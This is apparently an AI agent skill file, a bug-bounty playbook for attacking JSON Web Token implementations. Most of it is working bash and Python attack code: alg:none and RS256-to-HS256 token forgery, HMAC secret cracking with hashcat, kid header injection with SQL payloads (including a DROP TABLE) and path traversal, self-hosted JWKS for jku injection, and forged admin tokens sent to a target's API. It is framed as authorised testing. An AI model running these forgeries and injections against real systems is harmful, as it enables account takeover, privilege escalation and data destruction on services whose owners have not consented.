---
name: jwt-hunter
description: Systematically test JSON Web Token implementations for all known attack classes — algorithm confusion (alg:none, RS256→HS256, ECDSA key confusion), signature bypass, claims tampering, weak secret brute-force, kid/jku/x5u header injection, JWT-in-cookie misconfigurations, token sidejacking, and expiry/revocation failures. Use this skill whenever JWT tokens are present in Authorization headers, cookies, or API responses — independent of whether OAuth is in scope. Trigger on phrases like "test JWT", "token forgery", "alg confusion", "JWT bypass", "HMAC brute force", or when recon reveals Bearer tokens, JWT-shaped cookies, or /.well-known/jwks.json endpoints. This skill goes deeper than /oauth-hunter's Phase 5 — run it when JWT is the primary attack surface.
---

# JWT Hunter Skill

You are auditing a JSON Web Token implementation. JWTs are deceptively easy to misuse — a correctly formatted token with a broken verification routine is indistinguishable from a valid one at the network level, making these bugs high-impact and often overlooked. The attack surface spans three layers: the header (algorithm and key directives), the payload (claims), and the signature (validation logic).

Run phases in order. Do not skip Phase 1 — the algorithm and key material determine which attacks apply.

---

## Phase 1 — Token Collection and Anatomy

### Step 1.1 — Capture All JWT Surfaces

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/jwt

# Grep recon output for JWT-shaped values (three base64url segments separated by dots)
grep -oP 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' \
  $TARGET_DIR/recon/js/endpoints.txt \
  $TARGET_DIR/recon/js/secrets.txt 2>/dev/null | \
  sort -u > $TARGET_DIR/recon/jwt/raw-tokens.txt

echo "[*] Unique JWT-shaped values found: $(wc -l < $TARGET_DIR/recon/jwt/raw-tokens.txt)"

# Note token sources manually:
# - Authorization: Bearer <token> (API calls)
# - Cookie: session=<token> / token=<token> / jwt=<token>
# - JSON response body: access_token, id_token, refresh_token, api_key
# - URL parameters: ?token=, ?auth=
# - LocalStorage/SessionStorage (visible in JS recon)
```

### Step 1.2 — Decode and Map Every Distinct Token

For each unique token collected, decode without verification:

```bash
decode_jwt() {
  local TOKEN="$1"
  local LABEL="$2"
  echo "=== $LABEL ==="
  echo "--- HEADER ---"
  echo $TOKEN | cut -d. -f1 | \
    python3 -c "import sys,base64,json
raw=sys.stdin.read().strip()
pad=raw+'='*((4-len(raw)%4)%4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(pad)),indent=2))"
  echo "--- PAYLOAD ---"
  echo $TOKEN | cut -d. -f2 | \
    python3 -c "import sys,base64,json
raw=sys.stdin.read().strip()
pad=raw+'='*((4-len(raw)%4)%4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(pad)),indent=2))"
  SIG=$(echo $TOKEN | cut -d. -f3)
  echo "--- SIGNATURE (b64url) ---"
  echo "$SIG"
  [ -z "$SIG" ] && echo "[!] EMPTY SIGNATURE — alg:none candidate"
}

# Usage:
# decode_jwt "eyJ..." "access_token"
```

**Record for each token:**

| Field | Value |
|---|---|
| `alg` | RS256 / HS256 / ES256 / PS256 / none / other |
| `kid` | Present? Value? (path-like? URL?) |
| `jku` | Present? Points where? |
| `x5u` | Present? Points where? |
| `typ` | JWT / JWS / other |
| `sub` | User identifier format |
| `iss` | Issuer URL |
| `aud` | Audience — single value or array? |
| `exp` | Expiry timestamp — how far in the future? |
| `iat` | Issued-at |
| `jti` | JWT ID — present? (revocation indicator) |
| `role` / `scope` / `admin` | Any authorization claims? |

Save this mapping:
```bash
echo "Token anatomy notes" > $TARGET_DIR/recon/jwt/token-map.txt
# Append findings from decode above
```

---

## Phase 2 — Algorithm Confusion Attacks

### Step 2.1 — alg:none Attack

The `none` algorithm disables signature verification. Many libraries originally accepted it — some still do.

```bash
TOKEN="[target JWT here]"
PAYLOAD=$(echo $TOKEN | cut -d. -f2)

# Tamper payload: escalate role / change sub to admin or another user's ID
TAMPERED_PAYLOAD=$(echo '{"sub":"admin","role":"administrator","iss":"https://TARGET","iat":1700000000,"exp":9999999999}' | \
  python3 -c "import sys,base64,json
data=sys.stdin.read().strip()
enc=base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()
print(enc)")

# Build alg:none header
NONE_HEADER=$(echo '{"alg":"none","typ":"JWT"}' | \
  python3 -c "import sys,base64
data=sys.stdin.read().strip()
enc=base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()
print(enc)")

# Variants: empty sig, no sig, trailing dot
for SIG in "" "fakesig" "AAAA"; do
  TAMPERED="$NONE_HEADER.$TAMPERED_PAYLOAD.$SIG"
  echo "[alg:none sig='$SIG'] Testing..."
  curl -sk -H "Authorization: Bearer $TAMPERED" \
    "https://$TARGET_DOMAIN/api/profile" -w " [%{http_code}]\n" -o /dev/null
done

# Also test capitalisation variants
for ALG in "None" "NONE" "nOnE"; do
  HDR=$(echo "{\"alg\":\"$ALG\",\"typ\":\"JWT\"}" | \
    python3 -c "import sys,base64; d=sys.stdin.read().strip(); print(base64.urlsafe_b64encode(d.encode()).rstrip(b'=').decode())")
  TAMPERED="$HDR.$TAMPERED_PAYLOAD."
  echo "[alg:$ALG] Testing..."
  curl -sk -H "Authorization: Bearer $TAMPERED" \
    "https://$TARGET_DOMAIN/api/profile" -w " [%{http_code}]\n" -o /dev/null
done
```

**Validation:** Any 200/authenticated response with a tampered payload = Critical.

### Step 2.2 — RS256 → HS256 Algorithm Confusion

If the server uses RS256 (asymmetric), test whether it also accepts HS256 tokens signed with the **public key** as the HMAC secret. The public key is often freely available via JWKS.

```bash
# Step 1: Fetch the public key
JWKS_URI=$(curl -sk "https://$TARGET_DOMAIN/.well-known/openid-configuration" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('jwks_uri',''))" 2>/dev/null)
[ -z "$JWKS_URI" ] && JWKS_URI="https://$TARGET_DOMAIN/.well-known/jwks.json"

curl -sk "$JWKS_URI" > $TARGET_DIR/recon/jwt/jwks.json
echo "[*] JWKS saved to $TARGET_DIR/recon/jwt/jwks.json"

# Step 2: Extract PEM from JWKS (requires python-jose or similar)
python3 -c "
import json, base64
with open('$TARGET_DIR/recon/jwt/jwks.json') as f:
    jwks = json.load(f)
key = jwks['keys'][0]
print('Key type:', key.get('kty'))
print('Key use:', key.get('use'))
print('Kid:', key.get('kid'))
print('n (RSA modulus present):', bool(key.get('n')))
"

# Step 3: Use jwt_tool for the actual RS256→HS256 confusion test
# jwt_tool must be installed: pip3 install jwt_tool OR git clone https://github.com/ticarpi/jwt_tool
echo "[*] Run the following with jwt_tool:"
echo "    jwt_tool '$TOKEN' -X k -pk $TARGET_DIR/recon/jwt/public_key.pem"
echo "    (Export PEM from JWKS first using: python3 -c \"from Crypto.PublicKey import RSA; ...\")"

# Automated approach with jwt_tool if available
if command -v jwt_tool &>/dev/null; then
  jwt_tool "$TOKEN" -X k 2>/dev/null | tee $TARGET_DIR/recon/jwt/alg-confusion.txt
fi
```

### Step 2.3 — ECDSA Key Confusion (ES256 → HS256)

Same principle as RS256→HS256 but for ECDSA-signed tokens:

```bash
# If alg is ES256/ES384/ES512, test HS256 with the public key bytes as secret
echo "[*] If alg is ESxxx, test HS256 confusion with jwt_tool -X k"
echo "    This applies when the server shares its ECDSA public key via JWKS"
```

### Step 2.4 — Weak HMAC Secret Brute Force

If `alg` is HS256/HS384/HS512, the token is signed with a shared secret. Weak secrets are crackable offline.

```bash
TOKEN="[HS256 JWT here]"

# hashcat approach (GPU-accelerated — fastest)
echo "$TOKEN" > /tmp/jwt_crack.txt
hashcat -a 0 -m 16500 /tmp/jwt_crack.txt \
  /usr/share/wordlists/rockyou.txt \
  --potfile-path=/tmp/jwt_crack.pot \
  -O 2>/dev/null | tee $TARGET_DIR/recon/jwt/hmac-crack.txt

# john approach (CPU fallback)
john --wordlist=/usr/share/wordlists/rockyou.txt \
  --format=HMAC-SHA256 /tmp/jwt_crack.txt 2>/dev/null

# Also try common/default secrets directly
for SECRET in \
  "secret" "password" "123456" "changeme" "jwt_secret" \
  "your-256-bit-secret" "your-secret-key" "supersecret" \
  "development" "test" "app_secret" "$TARGET_DOMAIN" \
  "$(echo $TARGET_DOMAIN | tr '.' '_')" "mysecret" "key"; do
  RESULT=$(python3 -c "
import hmac, hashlib, base64, sys
token='$TOKEN'
secret='$SECRET'
parts=token.split('.')
sig_input=(parts[0]+'.'+parts[1]).encode()
expected=hmac.new(secret.encode(),sig_input,hashlib.sha256).digest()
expected_b64=base64.urlsafe_b64encode(expected).rstrip(b'=').decode()
print('MATCH' if expected_b64==parts[2] else 'no')
" 2>/dev/null)
  [ "$RESULT" = "MATCH" ] && echo "[CRACKED] Secret: '$SECRET'" && \
    echo "Secret: $SECRET" >> $TARGET_DIR/recon/jwt/hmac-crack.txt
done
```

**If cracked:** You can forge arbitrary tokens with any claims — Critical.

---

## Phase 3 — Header Injection Attacks

### Step 3.1 — `kid` (Key ID) Header Injection

The `kid` parameter tells the server which key to use for verification. If user-controlled, it can be manipulated for:

**SQL Injection via kid:**
```bash
# If kid is used in a DB query to fetch the key, inject SQLi
# Typical vulnerable code: SELECT key FROM keys WHERE id='[kid]'
for PAYLOAD in \
  "' OR '1'='1" \
  "1 UNION SELECT 'attacker_secret'--" \
  "1; DROP TABLE keys--" \
  "../../etc/passwd"; do
  echo "[kid inject] Testing: $PAYLOAD"
  # Construct token with injected kid header
  INJECTED_HDR=$(python3 -c "
import base64, json
h={'alg':'HS256','typ':'JWT','kid':'$PAYLOAD'}
print(base64.urlsafe_b64encode(json.dumps(h).encode()).rstrip(b'=').decode())")
  # Sign with a known value (e.g. empty string or 'a') matching the injected secret
  # Then test if server accepts it
done
echo "[*] Use jwt_tool for automated kid injection: jwt_tool '$TOKEN' -I -hc kid -hv '../../../dev/null' -S hs256 -p ''"
```

**Path Traversal via kid (sign with /dev/null or known file content):**
```bash
# If kid is used as a filesystem path to read the key:
# kid = ../../dev/null → server reads empty file → HMAC key is empty string
# Forge token signed with empty string as HMAC secret
python3 -c "
import hmac, hashlib, base64, json

header = {'alg': 'HS256', 'typ': 'JWT', 'kid': '../../dev/null'}
payload = {'sub': 'admin', 'role': 'administrator', 'exp': 9999999999}

h = base64.urlsafe_b64encode(json.dumps(header, separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload, separators=(',',':')).encode()).rstrip(b'=').decode()

sig_input = f'{h}.{p}'.encode()
sig = hmac.new(b'', sig_input, hashlib.sha256).digest()  # empty key
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()

print(f'{h}.{p}.{sig_b64}')
"
```

### Step 3.2 — `jku` (JWK Set URL) Header Injection

The `jku` header tells the server where to fetch the public key for verification. If accepted without allowlisting, an attacker can host their own JWKS.

```bash
# Step 1: Generate an RSA key pair
openssl genrsa -out /tmp/jwt_privkey.pem 2048
openssl rsa -in /tmp/jwt_privkey.pem -pubout -out /tmp/jwt_pubkey.pem

# Step 2: Create a JWKS file from the public key
python3 -c "
from Crypto.PublicKey import RSA
import base64, json, struct

with open('/tmp/jwt_privkey.pem') as f:
    key = RSA.import_key(f.read())

def int_to_base64url(n):
    length = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(length, 'big')).rstrip(b'=').decode()

jwks = {
    'keys': [{
        'kty': 'RSA',
        'use': 'sig',
        'alg': 'RS256',
        'kid': 'attacker-key-1',
        'n': int_to_base64url(key.n),
        'e': int_to_base64url(key.e)
    }]
}
print(json.dumps(jwks, indent=2))
" > /tmp/attacker_jwks.json

# Step 3: Host the JWKS (use Burp Collaborator URL or ngrok)
# ngrok http 8080 &
# python3 -m http.server 8080 --directory /tmp &

# Step 4: Forge a JWT with jku pointing to your server
echo "[*] Forge JWT with jku header pointing to your hosted JWKS"
echo "    Use jwt_tool: jwt_tool '$TOKEN' -X s -ju 'https://[your-collab-url]/attacker_jwks.json'"
echo "    Then sign with /tmp/jwt_privkey.pem"

# Detection: if server fetches your JWKS URL (visible in Collaborator/ngrok) AND accepts the token → jku injection confirmed
```

### Step 3.3 — `x5u` (X.509 URL) Header Injection

Same attack pattern as `jku` but via the X.509 certificate URL field:

```bash
echo "[*] Test x5u injection:"
echo "    Forge a self-signed cert, host it, set x5u header to your URL"
echo "    Use jwt_tool: jwt_tool '$TOKEN' -X s -xu 'https://[your-collab-url]/cert.pem'"
```

### Step 3.4 — Embedded JWK Header Injection

Some libraries accept a `jwk` header containing an inline public key and use it directly for verification — without checking if the key is trusted:

```bash
# Generate key pair then embed the public key directly in the JWT header
echo "[*] Test embedded JWK injection:"
echo "    jwt_tool '$TOKEN' -X e"
echo "    This generates a token where the header contains 'jwk': {public key you control}"
echo "    If server accepts it → it trusts attacker-supplied embedded keys"
```

---

## Phase 4 — Claims Tampering and Privilege Escalation

### Step 4.1 — Signature Validation Check (Baseline)

Before testing claims tampering, confirm whether the server validates signatures at all:

```bash
TOKEN="[valid JWT]"
HEADER=$(echo $TOKEN | cut -d. -f1)
PAYLOAD=$(echo $TOKEN | cut -d. -f2)
SIG=$(echo $TOKEN | cut -d. -f3)

# Flip one character in the signature
BROKEN_SIG=$(echo $SIG | sed 's/./A/1')
BROKEN_TOKEN="$HEADER.$PAYLOAD.$BROKEN_SIG"

echo "[*] Testing broken signature..."
RESP=$(curl -sk -H "Authorization: Bearer $BROKEN_TOKEN" \
  "https://$TARGET_DOMAIN/api/profile" -w "%{http_code}" -o /tmp/jwt_resp.txt)
echo "Response code: $RESP"
cat /tmp/jwt_resp.txt | head -5

[ "$RESP" = "200" ] && echo "[CRITICAL] Signature not validated — all claims are forgeable"
```

### Step 4.2 — Privilege Escalation via Role/Admin Claims

If signature is validated but a weak secret was found (Phase 2.4), re-sign with elevated claims:

```bash
CRACKED_SECRET="[cracked HMAC secret]"

python3 -c "
import hmac, hashlib, base64, json, time

header = {'alg': 'HS256', 'typ': 'JWT'}
payload = {
    'sub': 'admin',
    'role': 'administrator',
    'admin': True,
    'iss': 'TARGET_ISSUER',
    'iat': int(time.time()),
    'exp': int(time.time()) + 86400
}
secret = '$CRACKED_SECRET'

h = base64.urlsafe_b64encode(json.dumps(header, separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload, separators=(',',':')).encode()).rstrip(b'=').decode()
sig_input = f'{h}.{p}'.encode()
sig = hmac.new(secret.encode(), sig_input, hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f'{h}.{p}.{sig_b64}')
" | tee /tmp/forged_admin.jwt

curl -sk -H "Authorization: Bearer $(cat /tmp/forged_admin.jwt)" \
  "https://$TARGET_DOMAIN/api/admin" -w "\n[%{http_code}]"
```

### Step 4.3 — User ID / Subject Enumeration

Modify the `sub` claim to access other users' data:

```bash
KNOWN_TOKEN="[your valid JWT]"
KNOWN_SUB=$(echo $KNOWN_TOKEN | cut -d. -f2 | \
  python3 -c "import sys,base64,json; raw=sys.stdin.read().strip(); pad=raw+'='*((4-len(raw)%4)%4); print(json.loads(base64.urlsafe_b64decode(pad)).get('sub',''))")
echo "Your sub: $KNOWN_SUB"

# If sub is numeric/UUID, enumerate adjacent IDs after cracking the secret or confirming no-sig-check
echo "[*] With a forged secret, test sub: 1, 2, admin, root, 0"
```

---

## Phase 5 — Token Lifecycle Failures

### Step 5.1 — Expiry Not Enforced

```bash
TOKEN="[JWT here]"

EXP=$(echo $TOKEN | cut -d. -f2 | \
  python3 -c "import sys,base64,json
raw=sys.stdin.read().strip()
pad=raw+'='*((4-len(raw)%4)%4)
d=json.loads(base64.urlsafe_b64decode(pad))
print(d.get('exp','NOT SET'))")
NOW=$(date +%s)
echo "Token exp: $EXP | Now: $NOW | Expired: $([ \"$EXP\" -lt \"$NOW\" ] 2>/dev/null && echo YES || echo NO/NOT SET)"

# If expired, test acceptance anyway
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://$TARGET_DOMAIN/api/profile" -w "\n[%{http_code}]"
```

### Step 5.2 — Token Revocation / Logout Bypass

After logging out, test whether the original token still works:

```bash
echo "[MANUAL STEPS]"
echo "1. Authenticate — capture JWT"
echo "2. Call logout endpoint (DELETE /session, POST /logout, etc.)"
echo "3. Re-use the pre-logout JWT on an authenticated endpoint"
echo "4. If 200 returned — tokens are not revoked server-side"
echo ""
echo "[*] Also test: password change → old token still valid?"
echo "[*] Also test: account deactivation → old token still valid?"
```

### Step 5.3 — JWT in Cookie — Missing Security Attributes

```bash
# Capture Set-Cookie headers and check JWT-bearing cookies for security flags
curl -sk -I "https://$TARGET_DOMAIN/login_endpoint" 2>/dev/null | \
  grep -i "set-cookie" | grep -iE "eyJ" | \
  while read -r line; do
    echo "Cookie: $line"
    echo "$line" | grep -qi "HttpOnly" || echo "  [!] MISSING HttpOnly — XSS can steal this token"
    echo "$line" | grep -qi "Secure" || echo "  [!] MISSING Secure — token sent over HTTP"
    echo "$line" | grep -qi "SameSite=Strict\|SameSite=Lax" || echo "  [!] MISSING SameSite — CSRF risk"
  done
```

### Step 5.4 — JWT Sidejacking (Token Theft via Unencrypted Channels)

```bash
# Check if the target serves any authenticated endpoints over HTTP
for HOST in $(cat $TARGET_DIR/recon/subdomains/live-hostnames.txt | head -20); do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "http://$HOST/api/profile" \
    -H "Authorization: Bearer $TOKEN" --max-time 5)
  [ "$STATUS" = "200" ] && echo "[!] JWT accepted over HTTP on $HOST"
done
```

---

## Phase 6 — Audience and Issuer Confusion

### Step 6.1 — Audience (`aud`) Bypass

If multiple services share a signing key but each only accepts tokens with their own `aud`, test cross-service token reuse:

```bash
# Get a token from Service A, use it on Service B
echo "[MANUAL] Capture token from Service A (e.g. mobile API)"
echo "Test it against Service B (e.g. admin panel) — same issuer?"
echo "If aud validation is absent on Service B → token reuse across services"
```

### Step 6.2 — Issuer (`iss`) Confusion

```bash
# Some multi-tenant apps accept tokens from any issuer matching a broad pattern
# Test: forge a token with iss = http://attacker.com/
# If accepted without strict iss check → any issuer is trusted
echo "[*] After cracking secret or confirming no-sig-check:"
echo "    Set iss to 'https://attacker.com' and test acceptance"
```

### Step 6.3 — Cross-Tenant Token Reuse (SaaS Targets)

```bash
echo "[MANUAL] Multi-tenant check:"
echo "1. Create two accounts on different tenants (e.g. orgA.target.com, orgB.target.com)"
echo "2. Capture JWT from orgA session"
echo "3. Send it to orgB's API endpoints"
echo "4. If data from orgB is returned → tenant isolation broken via JWT"
```

---

## Phase 7 — Tooling Reference

### jwt_tool (Primary)

```bash
# Install
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip3 install -r requirements.txt

# Decode
python3 jwt_tool.py [TOKEN]

# Test all common attacks in one pass (-A = all checks)
python3 jwt_tool.py [TOKEN] -t "https://$TARGET_DOMAIN/api/profile" \
  -rh "Authorization: Bearer" -A 2>/dev/null | tee $TARGET_DIR/recon/jwt/jwt_tool_scan.txt

# Specific attacks:
# -X a  = alg:none
# -X k  = RS256→HS256 key confusion
# -X n  = null signature
# -X e  = embedded JWK
# -X s  = jku/x5u injection (add -ju or -xu)
# -I    = inject claims (-pc key -pv value)
```

### hashcat (HMAC Brute Force)

```bash
# Mode 16500 = JWT HS256/HS384/HS512
hashcat -a 0 -m 16500 [TOKEN] /usr/share/wordlists/rockyou.txt -O
# Custom rules for common JWT secrets
hashcat -a 0 -m 16500 [TOKEN] /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### CyberChef (Manual Analysis)

```
https://gchq.github.io/CyberChef/
Recipe: "From Base64" with URL-safe alphabet on each segment
```

---

## Output Summary

All output files written to `$TARGET_DIR/recon/jwt/`:

| File | Contents |
|---|---|
| `raw-tokens.txt` | All collected JWT-shaped values |
| `token-map.txt` | Decoded anatomy for each token (alg, claims, kid, etc.) |
| `jwks.json` | JWKS key material from target |
| `hmac-crack.txt` | Hashcat / manual brute-force results |
| `alg-confusion.txt` | jwt_tool algorithm confusion test output |
| `jwt_tool_scan.txt` | Full jwt_tool -A scan output |

---

## Severity Reference

| Finding | Severity |
|---|---|
| alg:none accepted — arbitrary claims forged | Critical |
| RS256→HS256 confusion accepted | Critical |
| Signature not validated at all (bit-flip test) | Critical |
| HMAC secret cracked + privilege escalation confirmed | Critical |
| kid path traversal → sign with empty/known-content key | Critical |
| jku / x5u / embedded JWK injection accepted | Critical |
| Cross-tenant token reuse (data from other org returned) | Critical |
| Weak HMAC secret cracked (no escalation yet) | High |
| kid SQL injection (query error or different behavior) | High |
| Token revocation not enforced post-logout | High |
| Expiry (`exp`) not validated | High |
| Audience (`aud`) not validated (cross-service reuse) | Medium |
| Issuer (`iss`) not validated | Medium |
| JWT in cookie missing HttpOnly / Secure / SameSite | Low–Medium |
| JWT accepted over HTTP (sidejacking possible) | Medium |

---

## Guiding Principles

- **Always run the bit-flip test first.** If the signature is not validated at all, every other test becomes trivially exploitable. Confirming this in 30 seconds saves an entire phase of work.
- **The `kid` header is the most overlooked injection surface.** Most hunters skip it. Path traversal to `/dev/null` is the fastest Critical on vulnerable servers — test it before complex algorithm confusion attacks.
- **alg:none is still alive.** Legacy libraries and custom implementations continue to accept it in 2025. Always test all capitalisation variants (`none`, `None`, `NONE`).
- **A cracked HMAC secret is not automatically a finding.** Escalate it: forge a token with elevated claims and confirm unauthorized access. A cracked secret with no escalation path is Medium at most.
- **jku/x5u injection requires a live callback.** Use Burp Collaborator or ngrok to confirm the server fetches your URL. A fetch without token acceptance is still a server-side request forgery primitive — document it.
- **Cross-tenant issues require two accounts.** Create accounts on two separate tenants before testing. Do not claim cross-tenant access without a PoC that shows another tenant's data in the response.
- **Run /triager before submitting.** JWT signature not validated is Critical. JWT cookie missing HttpOnly is Low. The gap is enormous — do not overstate impact on configuration-level findings without an end-to-end PoC.
